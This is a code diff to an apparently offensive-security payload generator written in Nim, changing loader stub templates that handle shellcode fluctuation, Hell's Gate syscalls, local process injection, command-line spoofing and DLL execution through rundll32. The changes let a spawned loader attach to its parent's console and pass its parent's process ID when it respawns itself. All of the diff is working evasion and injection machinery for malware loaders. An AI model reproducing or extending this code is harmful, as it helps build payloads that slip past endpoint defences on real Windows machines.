@@ -1491,7 +1491,14 @@ let LoadAssemblyStub = fmt"""
     when defined(lib_only):
         # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
         # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-        AttachConsole(-1)
+        when defined(ruylopez):
+            if(amISpawned()):
+                when defined(lib_only):
+                    AttachConsole(DWORD(paramStr(2).parseInt()))
+                else:
+                    AttachConsole(-1)
+        else:
+            AttachConsole(-1)
 
     when defined(Fluctuate):
         g_fluctuationData.shellcodeAddr = dectext[0].addr
@@ -1531,7 +1538,7 @@ let LoadAssemblyStub = fmt"""
             if(amISpawned()):
                 # for lib_only remove the 2nd argument from cmd, as this is the random integer fake param
                 when defined(lib_only):
-                    cmd = cmd[0 .. 1] & cmd[3 .. cmd.len - 1]
+                    cmd = cmd[1 .. cmd.len - 1]
                 else:
                     # remove the 1st parameter
                     cmd = cmd[1 .. cmd.len - 1]
@@ -2005,7 +2012,7 @@ when defined(Hellsgate):
 
 when defined(localinject):
     when defined(ruylopez):
-        from os import getAppFilename
+        from os import getAppFilename,getCurrentDir
         from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
         from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
         import dynlib
@@ -2798,7 +2805,14 @@ let DLLNoHideStub = """
     when defined(lib_only):
         # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
         # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-        AttachConsole(-1)
+        when defined(ruylopez):
+            if(amISpawned()):
+                when defined(lib_only):
+                    AttachConsole(DWORD(paramStr(2).parseInt()))
+                else:
+                    AttachConsole(-1)
+        else:
+            AttachConsole(-1)
 
 """
 
@@ -3004,19 +3018,15 @@ let NotepadProcIDStub * = fmt"""
         proc amISpawned(): bool =
             when defined(lib_only):
                 if(paramCount() >= 2):
-                    # if paramStr(2) is an integer between 1 and 100
-                    if((paramStr(2) != "") and checkIfInteger(paramStr(2))):
-                        if (parseInt(paramStr(2)) > 0) and (parseInt(paramStr(2)) <= 100):
-                            return true
+                    if(checkIfInteger(paramStr(2))):
+                        return true
                     else:
                         return false
             else:
                 # if one or more arguments provided return
                 if (paramCount() >= 1):
-                    if((paramStr(1) != "") and checkIfInteger(paramStr(1))):
-                        # check if integer between 1 and 100
-                        if (parseInt(paramStr(1)) > 0) and (parseInt(paramStr(1)) <= 100):
-                            return true
+                    if(checkIfInteger(paramStr(1))):
+                        return true
                     else:
                         when defined(verbose):
                             echo obf("[*] No input parameters, spawning process...")
@@ -3062,7 +3072,11 @@ let NotepadProcIDStub * = fmt"""
 
         
         when defined(localinject):
-
+            proc getParentProcessId(): int =
+                var hwnd = GetForegroundWindow()
+                var processId: DWORD = 0
+                GetWindowThreadProcessId(hwnd, cast[LPDWORD](addr(processId)))
+                return processId
             # we will for local execution spawn our own process again and inject the hook into it. SO we need the path for our own (the executing) process, which will be tProcPath
             #var hModule: HMODULE = GetModuleHandle(nil)
             #var path: string = newString(1024)
@@ -3075,6 +3089,11 @@ let NotepadProcIDStub * = fmt"""
             when defined(logFile):
                 logVerbose(obf("[*] Path to our own process: ") & pathString)
 
+            when defined(lib_only):
+                # we need to spawn our own DLL again, so we need to add rundll32.exe to the pathString but also the first argument from our current rundll32.exe process which should be the dll
+                # we also need the full path to the DLL, which means the CWD + the DLL name
+                pathString = pathString & " " & getCurrentDir() & "\\" & paramStr(1)
+            
             var comandline: string = ""
             var i = 1
             
@@ -3088,10 +3107,10 @@ let NotepadProcIDStub * = fmt"""
                 inc(i)          
 
             when defined spoof_args:
-                tProcPath = newWideCString(pathString & " " & obf("{randomArgs}") & comandline & obf("{spoofArgs}"))
+                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline & obf("{spoofArgs}"))
             else:
                 # add random args, so that it wont spawn itself again
-                tProcPath = newWideCString(pathString & " " & obf("{randomArgs}") & comandline)
+                tProcPath = newWideCString(pathString & " " & $getParentProcessId() & " " & comandline)
         else:
             when defined spoof_args:
                 tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
